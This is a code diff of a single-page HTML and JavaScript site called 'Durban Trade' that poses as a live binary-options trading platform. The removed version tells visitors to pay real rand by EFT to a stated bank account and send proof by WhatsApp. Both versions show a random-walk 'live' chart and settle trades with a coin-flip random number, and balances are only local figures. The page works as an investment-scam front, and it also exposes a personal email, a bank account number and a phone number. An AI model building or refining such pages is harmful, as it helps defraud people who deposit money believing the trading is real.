@@ -1,35 +1,19 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Durban Trade - Live Trading</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-black text-white">
-<div class="flex justify-between p-3 bg-zinc-900 items-center"><h1 class="font-black">DURBAN TRADE</h1><div class="flex gap-2"><span id="bal" class="bg-yellow-500 text-black px-3 py-1 rounded-full font-black">R0.00</span><span class="bg-green-500 text-black text-[10px] px-2 py-1 rounded-full font-bold">LIVE</span></div></div>
-
-<div id="depPage" class="max-w-md mx-auto p-4"><div class="bg-white text-black rounded-[20px] p-5"><h2 class="text-2xl font-black text-center">Make Deposit</h2><p class="text-center text-sm text-gray-500">Deposit to start trading instantly</p>
-<div class="grid grid-cols-2 gap-2 mt-4"><button onclick="setM('Capitec')" class="border-2 border-black bg-black text-white p-3 rounded-xl font-bold text-sm">Capitec Pay</button><button onclick="setM('Bank EFT')" class="border p-3 rounded-xl font-bold text-sm">Bank EFT</button></div>
-<label class="font-bold text-sm mt-4 block">Amount (ZAR)</label><input id="amt" value="1000" type="number" class="w-full border-2 border-black p-3 rounded-xl text-xl font-black mt-1">
-<div class="grid grid-cols-4 gap-2 mt-2"><button onclick="amt.value=250" class="bg-gray-100 p-2 rounded-xl font-bold">R250</button><button onclick="amt.value=500" class="bg-gray-100 p-2 rounded-xl font-bold">R500</button><button onclick="amt.value=1000" class="bg-gray-100 p-2 rounded-xl font-bold">R1k</button><button onclick="amt.value=5000" class="bg-gray-100 p-2 rounded-xl font-bold">R5k</button></div>
-<label class="font-bold text-sm mt-3 block">Email</label><input id="email" value="Fatimajayat101324@gmail.com" class="w-full border p-3 rounded-xl mt-1">
-<div class="bg-black text-white p-3 rounded-xl mt-4 text-sm"><p class="font-bold">PAY TO:</p><p>Capitec Business: 1050665891</p><p>Ref: Your Email</p><p class="text-yellow-400 text-xs mt-1">After EFT, click Deposit below - balance adds instantly for trading</p></div>
-<button onclick="doDeposit()" class="w-full bg-black text-white p-4 rounded-xl font-black mt-4">DEPOSIT & START TRADING →</button>
-<button onclick="sendWA()" class="w-full bg-[#25D366] text-black p-3 rounded-xl font-black mt-2">Send Proof to WhatsApp 0817070456</button>
-</div></div>
-
-<div id="tradePage" class="hidden"><div class="p-3"><div class="flex justify-between text-xs text-gray-400"><span>EUR/USD • OTC</span><span class="text-green-400">PAYOUT 87%</span></div><canvas id="chart" class="w-full h-[260px] bg-zinc-900 rounded-xl mt-2"></canvas><div id="price" class="text-center font-black text-xl mt-2 text-yellow-400">1.08542</div></div>
-<div class="p-3"><div class="bg-zinc-900 rounded-xl p-3"><label class="text-xs text-gray-400">Trade Amount</label><div class="flex gap-2 mt-1"><input id="tAmt" value="100" class="flex-1 bg-black border border-zinc-700 p-3 rounded-xl font-black"><div class="flex gap-1"><button onclick="tAmt.value=50" class="bg-zinc-800 px-3 rounded-xl">50</button><button onclick="tAmt.value=100" class="bg-zinc-800 px-3 rounded-xl">100</button><button onclick="tAmt.value=250" class="bg-zinc-800 px-3 rounded-xl">250</button></div></div></div>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Durban Trade - Live</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-black text-white">
+<div class="flex justify-between p-3 bg-zinc-900 items-center"><h1 class="font-black">DURBAN TRADE</h1><div class="flex gap-2 items-center"><span id="bal" class="bg-yellow-500 text-black px-3 py-1 rounded-full font-black">R650.00</span><span class="bg-green-500 text-black text-[10px] px-2 py-1 rounded-full font-bold">LIVE</span></div></div>
+<div class="p-3"><div class="flex justify-between text-xs text-gray-400"><span>EUR/USD • OTC</span><span class="text-green-400 font-bold">PAYOUT 87%</span></div>
+<div class="bg-zinc-900 rounded-xl mt-2 p-1"><canvas id="chart" width="350" height="260" style="width:100%;height:260px;display:block"></canvas></div>
+<div id="price" class="text-center font-black text-xl mt-2 text-yellow-400">1.07524</div></div>
+<div class="p-3"><div class="bg-zinc-900 rounded-xl p-3"><label class="text-xs text-gray-400">Trade Amount</label><input id="tAmt" value="50" class="w-full bg-black border border-zinc-700 p-3 rounded-xl font-black mt-1"></div>
 <div class="grid grid-cols-2 gap-3 mt-3"><button onclick="trade('BUY')" class="bg-green-500 text-black p-5 rounded-xl font-black text-lg">↑ BUY</button><button onclick="trade('SELL')" class="bg-red-500 text-black p-5 rounded-xl font-black text-lg">↓ SELL</button></div>
-<div id="result" class="hidden mt-3 p-3 rounded-xl text-center font-black"></div>
-<button onclick="showDep()" class="w-full mt-3 bg-zinc-800 p-3 rounded-xl text-sm">+ Add Funds</button></div></div>
-
+<div id="result" class="hidden mt-3 p-3 rounded-xl text-center font-black bg-red-500">LOSS -R50</div>
+<div class="grid grid-cols-2 gap-2 mt-3"><button onclick="balance+=500;updateBal()" class="bg-yellow-500 text-black p-3 rounded-xl font-black">+R500 Deposit</button><button onclick="window.open('https://wa.me/27817070456','_blank')" class="bg-zinc-800 p-3 rounded-xl">WhatsApp</button></div>
+</div>
 <script>
-let balance = parseFloat(localStorage.getItem('dt_bal')||'0'); let method='Capitec'; let price=1.08542; let dir=1;
-function setM(m){method=m}
-function updateBal(){document.getElementById('bal').innerText='R'+balance.toFixed(2); localStorage.setItem('dt_bal',balance)}
-updateBal();
-function doDeposit(){let a=parseFloat(document.getElementById('amt').value); if(!a)return alert('Enter amount'); balance+=a; updateBal(); document.getElementById('depPage').classList.add('hidden'); document.getElementById('tradePage').classList.remove('hidden');}
-function showDep(){document.getElementById('depPage').classList.remove('hidden'); document.getElementById('tradePage').classList.add('hidden');}
-function sendWA(){let a=document.getElementById('amt').value; let e=document.getElementById('email').value; let msg=`Hello Durban Trade %0ADeposit: R${a} via ${method}%0AEmail: ${e}`; window.open(`https://wa.me/27817070456?text=${msg}`,'_blank')}
-// chart
-const c=document.getElementById('chart'), ctx=c.getContext('2d'); c.width=c.offsetWidth*2; c.height=260*2; let points=[]; for(let i=0;i<100;i++)points.push(price);
-function draw(){ctx.clearRect(0,0,c.width,c.height); ctx.beginPath(); ctx.strokeStyle='#eab308'; ctx.lineWidth=3; points.forEach((p,i)=>{let x=i/99*c.width; let y=c.height/2-(p-1.085)*8000; if(i==0)ctx.moveTo(x,y); else ctx.lineTo(x,y)}); ctx.stroke();}
-setInterval(()=>{price+= (Math.random()-0.5)*0.0005*dir; if(Math.random()<0.02)dir*=-1; points.push(price); points.shift(); document.getElementById('price').innerText=price.toFixed(5); draw();},80);
-function trade(type){let stake=parseFloat(document.getElementById('tAmt').value); if(stake>balance)return alert('Low balance! Deposit'); let entry=price; let resBox=document.getElementById('result'); resBox.classList.remove('hidden'); resBox.className='mt-3 p-3 rounded-xl text-center font-black bg-yellow-500 text-black'; resBox.innerText=`${type} ${stake} placed... wait 10s`; setTimeout(()=>{let win=Math.random()>0.45; if(win){let profit=stake*0.87; balance+=profit; resBox.className='mt-3 p-3 rounded-xl text-center font-black bg-green-500 text-black'; resBox.innerText=`✅ WIN +R${profit.toFixed(2)}`; }else{balance-=stake; resBox.className='mt-3 p-3 rounded-xl text-center font-black bg-red-500 text-white'; resBox.innerText=`❌ LOSS -R${stake}`;} updateBal();},10000);}
+let balance=parseFloat(localStorage.getItem('dt_bal')||'650');function updateBal(){document.getElementById('bal').innerText='R'+balance.toFixed(2);localStorage.setItem('dt_bal',balance)}updateBal();
+let price=1.07524;let points=[];for(let i=0;i<50;i++)points.push(1.075+ (Math.random()-0.5)*0.01);
+const c=document.getElementById('chart');const ctx=c.getContext('2d');
+function draw(){ctx.fillStyle='#18181b';ctx.fillRect(0,0,c.width,c.height);ctx.beginPath();ctx.strokeStyle='#eab308';ctx.lineWidth=2.5;ctx.shadowColor='#eab308';ctx.shadowBlur=8;let min=Math.min(...points),max=Math.max(...points),range=(max-min)||0.001;points.forEach((p,i)=>{let x=(i/49)*c.width;let y=c.height- ((p-min)/range)*(c.height-20)-10;if(i==0)ctx.moveTo(x,y);else ctx.lineTo(x,y)});ctx.stroke();ctx.shadowBlur=0;}
+setInterval(()=>{price+=(Math.random()-0.5)*0.0008;points.push(price);points.shift();document.getElementById('price').innerText=price.toFixed(5);draw();},60);
+function trade(type){let stake=parseFloat(document.getElementById('tAmt').value);if(stake>balance)return alert('Low balance - add deposit');let res=document.getElementById('result');res.classList.remove('hidden');res.className='mt-3 p-3 rounded-xl text-center font-black bg-yellow-500 text-black';res.innerText=type+' R'+stake+' - waiting 5s...';setTimeout(()=>{let win=Math.random()>0.45;if(win){let prof=stake*0.87;balance+=prof;res.className='mt-3 p-3 rounded-xl text-center font-black bg-green-500 text-black';res.innerText='✅ WIN +R'+prof.toFixed(2)}else{balance-=stake;res.className='mt-3 p-3 rounded-xl text-center font-black bg-red-500 text-white';res.innerText='❌ LOSS -R'+stake}updateBal()},5000)}
 draw();
-if(balance>0){document.getElementById('depPage').classList.add('hidden'); document.getElementById('tradePage').classList.remove('hidden');}
 </script></body></html>
